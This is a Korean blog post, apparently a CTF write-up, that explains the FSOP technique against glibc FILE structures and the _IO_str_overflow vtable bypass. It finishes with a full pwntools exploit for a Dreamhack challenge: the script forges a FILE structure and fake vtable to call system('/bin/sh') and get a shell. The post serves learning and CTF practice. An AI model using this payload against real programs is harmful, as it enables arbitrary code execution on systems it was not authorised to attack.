@@ -1,0 +1,352 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] FSOP · whrds.log</title><meta name="description" content="FSOPFile Stream Oriented ProgrammingC의 표준 라이브러리인 libc에서 file stream의 내부 필드를 조작하여 악의적인 코드를 수행하는 공격 기법이다. libc에서 파일 스트림은 FILE 구조체로 관리되며, 이 구조체의 필드들은 파일 입출력 작업을 추상화한다.file stream 구조체 ">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/pwnable-fsop/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-fsop/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-fsop/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] FSOP · whrds.log"><meta property="og:description" content="FSOPFile Stream Oriented ProgrammingC의 표준 라이브러리인 libc에서 file stream의 내부 필드를 조작하여 악의적인 코드를 수행하는 공격 기법이다. libc에서 파일 스트림은 FILE 구조체로 관리되며, 이 구조체의 필드들은 파일 입출력 작업을 추상화한다.file stream 구조체 "><meta property="og:url" content="https://whrds.github.io/ko/posts/pwnable-fsop/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] FSOP","description":"FSOPFile Stream Oriented ProgrammingC의 표준 라이브러리인 libc에서 file stream의 내부 필드를 조작하여 악의적인 코드를 수행하는 공격 기법이다. libc에서 파일 스트림은 FILE 구조체로 관리되며, 이 구조체의 필드들은 파일 입출력 작업을 추상화한다.file stream 구조체 ","datePublished":"2024-06-24","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/pwnable-fsop/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/pwnable-fsop/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] FSOP</h1><p class="article-description">FSOPFile Stream Oriented ProgrammingC의 표준 라이브러리인 libc에서 file stream의 내부 필드를 조작하여 악의적인 코드를 수행하는 공격 기법이다. libc에서 파일 스트림은 FILE 구조체로 관리되며, 이 구조체의 필드들은 파일 입출력 작업을 추상화한다.file stream 구조체 </p><div class="article-meta"><time datetime="2024-06-24">2024년 6월 24일</time><span>·</span><span>2 분 읽기</span></div></header><div class="prose"><h3>FSOP</h3>
+<p>File Stream Oriented Programming</p>
+<p>C의 표준 라이브러리인 libc에서 file stream의 내부 필드를 조작하여 악의적인 코드를 수행하는 공격 기법이다. libc에서 파일 스트림은 FILE 구조체로 관리되며, 이 구조체의 필드들은 파일 입출력 작업을 추상화한다.</p>
+<ul>
+<li>file stream 구조체 이해 : libc의 FILE 구조체를 분석하여 필드를 파악해야 한다.</li>
+</ul>
+<p>_IO_FILE : 리눅스 시스템의 표준 라이브러리에서 파일 스트림을 나타내기 위한 구조체이다.</p>
+<pre><code>struct _IO_FILE_plus
+{
+FILE file;
+  const struct _IO_jump_t *vtable;
+};
+struct _IO_FILE
+{
+  int _flags;
+  char *_IO_read_ptr;
+  char *_IO_read_end;
+  char *_IO_read_base;
+  char *_IO_write_base;
+  char *_IO_write_ptr;
+  char *_IO_write_end;
+  char *_IO_buf_base;
+  char *_IO_buf_end;
+  char *_IO_save_base;
+  char *_IO_backup_base;
+  char *_IO_save_end;
+  struct _IO_marker *_markers;
+  struct _IO_FILE *_chain;
+  int _fileno;
+  int _flags2;
+  __off_t _old_offset;
+  unsigned short _cur_column;
+  signed char _vtable_offset;
+  char _shortbuf[1];
+  _IO_lock_t *_lock;
+#ifdef _IO_USE_OLD_IO_FILE
+};
+</code></pre>
+<p>_flags : 파일에 대한 권한 </p>
+<p>(0xfbad0000이 매직넘버)</p>
+<p>_IO_read_ptr / _IO_write_ptr : 파일 읽기와 쓰기에 대한 버퍼 포인터</p>
+<p>_IO_read_base / _IO_write_base : 파일 읽기와 쓰기 버퍼의 시작 주소를 가리키는 포인터</p>
+<p>_IO_read_end / _IO_write_end : 파일 읽기와 쓰기 버퍼의 끝을 가리키는 포인터</p>
+<p>_chain : 링크드 리스트를 만드는 필드</p>
+<p>_fileno : 파일 디스크립터 값</p>
+<p>_IO_jump_t*vatlbe : 파일 관련 작업을 수행하는 가상 테이블</p>
+<pre><code>FILE *_IO_new_file_fopen(FILE *fp, const char
+*filename, const char *mode,
+                         int is32not64) {
+  int oflags = 0, omode;
+  int read_write;
+  int oprot = 0666;
+  int i;
+  FILE *result;
+  const char *cs;
+  const char *last_recognized;
+  if (_IO_file_is_open(fp)) return 0;
+  switch (*mode) {
+    case 'r':
+      omode = O_RDONLY;
+      read_write = _IO_NO_WRITES;
+      break;
+    case 'w':
+      omode = O_WRONLY;
+      oflags = O_CREAT | O_TRUNC;
+      read_write = _IO_NO_READS;
+      break;
+    case 'a':
+      omode = O_WRONLY;
+      oflags = O_CREAT | O_APPEND;
+      read_write = _IO_NO_READS | _IO_IS_APPENDING;
+      break;
+      ...
+}
+</code></pre>
+<p>fopne으로 파일을 열 때 _flags 변수를 전달하여 모드 값 설정한다.</p>
+<p>_IO_new_file_fopne함수에서 권한을 확인하고 설정한다.</p>
+<p><strong>_IO_FILE : vtable</strong></p>
+<p>객체 지향 프로그래밍 언어에서 클래스 정의 및 가상 함수를 사용할 때 할당되는 테이블이다.</p>
+<p>메모리에 가상 함수의 주소를 저장 및 사용하면 테이블을 기준으로 상대주소를 호출한다.</p>
+<pre><code>                               #define fread(p, m, n, s) _IO_fread (p, m, n, s)
+                               size_t
+                               _IO_fread (void *buf, size_t size, size_t count, FILE
+                               *fp)
+                               {
+                                 size_t bytes_requested = size * count;
+                                 size_t bytes_read;
+                                 CHECK_FILE (fp, 0);
+                                 if (bytes_requested == 0)
+                                   return 0;
+                                 _IO_acquire_lock (fp);
+                                 _IO_release_lock (fp);
+                                 return bytes_requested == bytes_read ? count :
+                               bytes_read / size;
+                               }
+</code></pre>
+<p>fread함수 호출 과정이다.</p>
+<p>위 코드에서 _IO_sgetn함수를 호출하고 있다.</p>
+<pre><code>#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP,
+DATA, N)
+#define JUMP2(FUNC, THIS, X1, X2)
+(_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)
+#define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable
+( (THIS)))
+size_t
+_IO_sgetn (FILE *fp, void *data, size_t n)
+{
+  /* FIXME handle putback buffer here! */
+  return _IO_XSGETN (fp, data, n);
+}
+</code></pre>
+<p>_IO_sgetn함수에서 _IO_XSGETN 호출한다.</p>
+<p>_IO_XSGETN함수는 vtable 구조체에 포함된 함수이다.</p>
+<p>fread함수를 포함한 파일 함수들이 vtable 변수 참조하는 것을 확인 가능하다.</p>
+<pre><code>#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP,
+DATA, N)
+#define JUMP2(FUNC, THIS, X1, X2)
+(_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)
+#define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable
+( (THIS)))
+size_t
+_IO_sgetn (FILE *fp, void *data, size_t n)
+{
+  return _IO_XSGETN (fp, data, n);
+}
+</code></pre>
+<p>vtable 참조하는 과정에서 IO_validate_vatlbe()호출한다.</p>
+<p>_libc_IO_vtables 섹션에 vtable 할당한다.</p>
+<pre><code>static inline const struct _IO_jump_t *
+IO_validate_vtable (const struct _IO_jump_t *vtable)
+{
+  /* Fast path: The vtable pointer is within the
+__libc_IO_vtables
+section. */
+uintptr_t section_length = __stop___libc_IO_vtables
+- __start___libc_IO_vtables;
+  const char *ptr = (const char *) vtable;
+  uintptr_t offset = ptr - __start___libc_IO_vtables;
+  if (__glibc_unlikely (offset &gt;= section_length))
+    /* The vtable pointer is not in the expected
+section.  Use the
+       slow path, which will terminate the process if
+necessary.  */
+    _IO_vtable_check ();
+  return vtable;
+}
+</code></pre>
+<p>vtable의 시작/끝 주소를 이용해서 세션의 크기를 파악한다.</p>
+<pre><code>int
+_IO_str_overflow (_IO_FILE *fp, int c)
+{
+  int flush_only = c == EOF;
+  _IO_size_t pos;
+  if (fp-&gt;_flags &amp; _IO_NO_WRITES)
+      return flush_only ? 0 : EOF;
+  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
+    {
+      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;
+      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;
+      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;
+    }
+  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
+  if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))
+    {
+      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */
+      return EOF;
+      else
+      {
+        char *new_buf;
+        char *old_buf = fp-&gt;_IO_buf_base;
+        size_t old_blen = _IO_blen (fp);
+        _IO_size_t new_size = 2 * old_blen + 100;
+        if (new_size &lt; old_blen)
+          return EOF;
+        new_buf
+          = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);
+</code></pre>
+<p>_IO_str_overflow는 _libc_IO_vtables에 포함되어 있다.</p>
+<p>마지막에 _s._allocate_buffer 함수 포인터를 호출한다.</p>
+<pre><code>#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)
+size_t old_blen = _IO_blen (fp);
+_IO_size_t new_size = 2 * old_blen + 100;
+if (new_size &lt; old_blen)
+return EOF;
+</code></pre>
+<p>함수 인자로 new_size 변수 전달한다.</p>
+<p>_IO_buf_end와 _IO_buf_base의 연산값을 이용한다.</p>
+<p>이 것으로 new_size 변수를 조작가능하다.</p>
+<pre><code>int
+_IO_str_overflow (_IO_FILE *fp, int c)
+{
+  int flush_only = c == EOF;
+  _IO_size_t pos;
+if (fp-&gt;_flags &amp; _IO_NO_WRITES)
+    return flush_only ? 0 : EOF;
+if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
+  {
+    fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;
+    fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;
+    fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;
+}
+pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
+if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))
+  {
+    if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */
+    return EOF;
+    else
+    {
+      char *new_buf;
+      char *old_buf = fp-&gt;_IO_buf_base;
+      size_t old_blen = _IO_blen (fp);
+      _IO_size_t new_size = 2 * old_blen + 100;
+      if (new_size &lt; old_blen)
+        return EOF;
+      new_buf
+        = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);
+</code></pre>
+<p>함수 포인터를 호출하기위해 확인해야 하는 코드이다.</p>
+<p>해당 부분을 분리해서 확인하겠다.</p>
+<pre><code> int flush_only = c == EOF;
+ _IO_size_t pos;
+pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
+ if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))
+</code></pre>
+<p>_IO_write_base와 _IO_write_ptr을 이용한다.</p>
+<p>flush_only의 초기값은 0이다.</p>
+<p>조건 부분을 보면 if(pos &gt;= _IO_blen(fp))이다.</p>
+<p>_IO_write_ptr = func@add<br>
+_IO_write_base = 0<br>
+pos = func@add</p>
+<p>dreamhack 문제 중 Bypass _IO_str_overflow을 풀어보겠다.</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+FILE *fp;
+void init() {
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+}
+int main() {
+  init();
+  fp = fopen(&quot;/dev/urandom&quot;, &quot;r&quot;);
+  printf(&quot;stdout: %p\n&quot;, stdout);
+  printf(&quot;Data: &quot;);
+  read(0, fp, 300);
+  fclose(fp);
+}
+</code></pre>
+<p>stdout 포인터의 주소를 출력해주기 때문에 libc_base를 구할 수 있다.</p>
+<pre><code>p.recvuntil(&quot;stdout: &quot;)
+stdout_leak = int(p.recvuntil(b&quot;\n&quot;).strip(b&quot;\n&quot;),16)
+libc_base = stdout_leak - libc.symbols['_IO_2_1_stdout_']
+io_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
+io_str_overflow = io_file_jumps + 0xd8
+fake_vtable = io_str_overflow - 16
+binsh = libc_base + next(libc.search(b&quot;/bin/sh&quot;))
+system_add = libc_base + libc.symbols['system']
+fp = elf.symbols['fp']
+</code></pre>
+<p>libc_base와 필요한 주소들을 구하는 과정이다.</p>
+<p>추가로 fake_vtable주소를 구할 수 있다.</p>
+<p>new_size 변수는 _IO_buf_end와 base를 이용하여 구하기 때문에</p>
+<p>_IO_buf_end를 binsh 문자열 주소로 설정하고 base를 0으로 설정하면</p>
+<p>new_size 변수는 binsh 문자열을 가리키게 된다.</p>
+<p>다시 조건을 살펴보면</p>
+<pre><code> int flush_only = c == EOF;
+ _IO_size_t pos;
+pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
+ if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))
+</code></pre>
+<p>_IO_write_ptr과 _IO_buf_end를 동일하게 설정해야 한다.</p>
+<p>-&gt; _IO_str_overflow의 조건을 통과하기 위해서다.</p>
+<pre><code>       new_buf
+         = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer)
+(new_size);
+</code></pre>
+<p>코드의 마지막에서 fclose함수 내부에서 _IO_FINISH를 호출한다.</p>
+<p>_IO_FINISH는 vatble주소부터 16바이트 떨어진 위치에 있는 주소를 호출한다.</p>
+<p>=&gt; vtable 주소를 (IO_str_overflow - 16) 주소로 덮으면 fcloase에 의해 IO_str_overflow 함수가 호출된다.</p>
+<pre><code>from pwn import *
+
+p = remote('host3.dreamhack.games', 15070)
+libc = ELF('./libc.so.6')
+elf = ELF('./bypass_valid_vtable')
+
+p.recvuntil(&quot;stdout: &quot;)
+stdout_leak = int(p.recvuntil(b&quot;\n&quot;).strip(b&quot;\n&quot;),16)
+libc_base = stdout_leak - libc.symbols['_IO_2_1_stdout_']
+
+io_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
+io_str_overflow = io_file_jumps + 0xd8
+fake_vtable = io_str_overflow - 16
+binsh = libc_base + next(libc.search(b&quot;/bin/sh&quot;))
+system_add = libc_base + libc.symbols['system']
+fp = elf.symbols['fp']
+
+payload = p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(int((binsh - 100) / 2))
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(int((binsh - 100) / 2))
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(0x0)
+payload += p64(fp + 0x80)
+payload += p64(0x0)*9
+payload += p64(fake_vtable)
+payload += p64(system_add)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>실행하면 flag를 얻을 수 있다.</p>
+<p><img src="/assets/images/tistory/tistory-8af5082e9c5d/001.png" alt=""></p>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/pwnable-fsop/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
